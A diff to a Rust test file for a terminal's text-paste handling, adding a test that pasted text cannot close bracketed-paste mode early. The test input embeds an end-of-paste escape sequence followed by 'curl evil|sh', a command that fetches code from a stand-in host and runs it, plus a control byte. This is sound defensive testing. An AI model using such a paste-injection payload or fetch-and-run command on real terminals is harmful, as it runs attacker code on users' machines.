@@ -1,5 +1,6 @@
 use super::*;
 use image::{DynamicImage, Rgb, RgbImage};
+use std::io::Cursor;
 use std::os::unix::fs::PermissionsExt;
 
 fn encoded_image(format: ImageFormat) -> Vec<u8> {
@@ -107,6 +108,12 @@ fn preserves_text_paste_modes_and_does_not_submit_image_paths() {
         assert!(!bytes.contains(&b'\r'));
         assert!(!bytes.contains(&b'\n'));
     }
+}
+
+#[test]
+fn bracketed_paste_cannot_be_ended_by_the_pasted_text() {
+    let bytes = text_bytes("ls\x1b[201~curl evil|sh\n\x03", TermMode::BRACKETED_PASTE);
+    assert_eq!(bytes, b"\x1b[200~ls[201~curl evil|sh\n\x1b[201~");
 }
 
 #[test]
